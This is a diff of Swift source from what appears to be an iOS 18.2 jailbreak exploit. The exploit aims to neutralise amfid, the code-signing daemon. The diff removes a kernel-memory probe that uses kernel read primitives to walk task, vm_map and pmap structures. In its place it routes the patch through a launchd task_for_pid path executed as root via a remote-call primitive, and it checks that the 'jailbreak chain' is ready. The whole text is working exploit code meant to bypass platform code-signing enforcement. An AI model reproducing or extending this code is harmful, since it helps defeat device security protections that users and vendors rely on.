@@ -170,149 +170,28 @@ final class ExpAmfidNopFinal {
     
     #if !DISABLE_REMOTECALL
     private func performPatchViaSB(amfidPid: Int32, amfidProc: UInt64) {
-        // SAFE MODE: Only READ kernel memory, NO writes
-        // This lets us see what values we get before any crash
-        log("[4/7] Kernel read-only probe (NO writes)...")
-        log("")
-        
-        let amfidTask = taskbyproc(amfidProc)
-        log("  amfid task: 0x\(String(format:"%llx", amfidTask))")
-        
-        guard amfidTask != 0 && (amfidTask >> 32) > 0xFFFFFF00 else {
-            log("❌ taskbyproc returned invalid value")
-            log("   Falling back to launchd...")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // Read vm_map — use ds_kreadptr (strips PAC!) instead of ds_kread64
-        // PAC-signed pointers look like garbage (0x99f7...) but are valid after xpaci
-        var vmMap = ds_kreadptr(amfidTask + UInt64(off_task_map))
-        log("  vm_map (task+0x\(String(format:"%x", off_task_map))): 0x\(String(format:"%llx", vmMap))")
-        
-        guard vmMap != 0 && (vmMap >> 32) > 0xFFFFFF00 else {
-            log("❌ vm_map invalid even after PAC strip")
-            log("   off_task_map may be wrong for this build")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // Read pmap (also PAC-signed)
-        // Try offset 0x40 first (found on this build), then 0x48
-        var pmap: UInt64 = 0
-        var pmapOffset: UInt64 = 0x40
-        
-        let pmap40 = ds_kreadptr(vmMap + 0x40)
-        let pmap48 = ds_kreadptr(vmMap + 0x48)
-        log("  pmap candidates:")
-        log("    vm_map+0x40 = 0x\(String(format:"%llx", pmap40))")
-        log("    vm_map+0x48 = 0x\(String(format:"%llx", pmap48))")
-        
-        if pmap40 != 0 && (pmap40 >> 32) > 0xFFFFFF00 {
-            pmap = pmap40
-            pmapOffset = 0x40
-        } else if pmap48 != 0 && (pmap48 >> 32) > 0xFFFFFF00 {
-            pmap = pmap48
-            pmapOffset = 0x48
-        }
-        
-        log("  pmap40: 0x\(String(format:"%llx", pmap40))")
-        log("  pmap48 (raw): 0x\(String(format:"%llx", pmap48))")
-        
-        // On iOS 18.2: vm_map+0x40 = pmap (kernel VA)
-        //              vm_map+0x48 = physical ttep (NOT readable via ds_kread64!)
-        // ds_kread64 only works on KERNEL VIRTUAL addresses.
-        // Physical addresses cause crash. We need ttep as kernel VA.
+        // Page table walk doesn't work on iOS 18.2 A12:
+        // - Page tables are in physical memory (PPL-controlled)
+        // - ds_kread64 can't read physical addresses
+        // - Only option: task_for_pid from launchd
         //
-        // The pmap struct should contain the ttep as a kernel VA somewhere.
-        // Try pmap+0x8, pmap+0x10, etc. — but ONLY read from kernel VAs.
-        // DO NOT read from physical addresses (0x6bab638000 etc.)
-        
-        guard pmap != 0 else {
-            log("❌ pmap not found")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        log("  ✅ pmap: 0x\(String(format:"%llx", pmap))")
-        
-        // Read first few qwords from pmap (all kernel VAs, safe to read)
-        var probeFoundTtep: UInt64 = 0
-        log("  Pmap contents (looking for ttep as kernel VA):")
-        for off: UInt64 in [0x0, 0x8, 0x10, 0x18, 0x20] {
-            let val = ds_kread64(pmap + off)
-            let isKVA = (val >> 32) > 0xFFFFFF00
-            // Only test L1[4] if it's a kernel VA (safe to dereference)
-            if isKVA {
-                let l1 = ds_kread64(val + 4 * 8)
-                let l1Valid = (l1 & 0x3) == 0x3
-                log("    pmap+0x\(String(format:"%02x", off)) = 0x\(String(format:"%llx", val)) → L1[4]=0x\(String(format:"%llx", l1)) \(l1Valid ? "✅" : "")")
-                if l1Valid && probeFoundTtep == 0 {
-                    probeFoundTtep = val
-                }
-            } else if val != 0 {
-                log("    pmap+0x\(String(format:"%02x", off)) = 0x\(String(format:"%llx", val)) (not KVA, skip)")
-            }
-        }
-        
-        if probeFoundTtep == 0 {
-            log("  ❌ ttep not found in pmap (no kernel VA with valid L1[4])")
-        }
-        
-        // Find text base — scan vm_map for userspace address
-        var textBase: UInt64 = 0
-        for off: UInt64 in [0x10, 0x18, 0x20, 0x28, 0x30] {
-            let val = ds_kread64(vmMap + off)
-            if val >= 0x100000000 && val < 0x280000000000 {
-                textBase = val
-                log("  text base (vm_map+0x\(String(format:"%x", off))): 0x\(String(format:"%llx", val)) ✅")
-                break
-            }
-        }
-        
-        if textBase == 0 {
-            // Try first vm_map_entry
-            let firstEntry = ds_kreadptr(vmMap + 0x08)
-            log("  first entry: 0x\(String(format:"%llx", firstEntry))")
-            if firstEntry != 0 && (firstEntry >> 32) > 0xFFFFFF00 {
-                for off: UInt64 in [0x08, 0x10, 0x18, 0x20] {
-                    let val = ds_kread64(firstEntry + off)
-                    if val >= 0x100000000 && val < 0x280000000000 {
-                        textBase = val
-                        log("  text base (entry+0x\(String(format:"%x", off))): 0x\(String(format:"%llx", val)) ✅")
-                        break
-                    }
-                }
-            }
-        }
-        
-        if textBase == 0 {
-            log("  ❌ text base not found in vm_map")
-        }
-        
-        // Validate
-        let ttepValid = probeFoundTtep != 0
-        let textValid = textBase >= 0x100000000 && textBase < 0x280000000000
-        
+        // Skip kernel direct path entirely — go straight to launchd
+        log("[4/7] Going to launchd task_for_pid (kernel path not viable on this build)...")
+        log("  (page tables in physical memory, not accessible via KRW)")
         log("")
-        log("  Validation:")
-        log("    ttep found: \(ttepValid ? "✅" : "❌")")
-        log("    text base: \(textValid ? "✅" : "❌")")
-        
-        guard ttepValid && textValid else {
-            log("")
-            log("❌ Cannot proceed — values invalid")
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        
-        // Proceed with page table walk
-        log("")
-        log("  All valid — page table walk...")
-        patchViaKernelDirect(amfidProc: amfidProc, amfidPid: amfidPid)
+        performPatchViaLaunchd(amfidPid: amfidPid)
     }
     
     private func performPatchViaLaunchd(amfidPid: Int32) {
         log("[4/7] task_for_pid(\(amfidPid)) from launchd...")
+        
+        // Pre-check: is RC even working?
+        guard dspmgr.shared.rcready else {
+            log("❌ RemoteCall not ready — cannot connect to launchd")
+            log("   Re-run jailbreak chain first")
+            return
+        }
+        log("  RC ready, connecting to launchd...")
         
         RootExecutor.shared.executeAsRoot(operation: "amfid_nop_final") { [self] rc in
             // Verify we're in launchd context
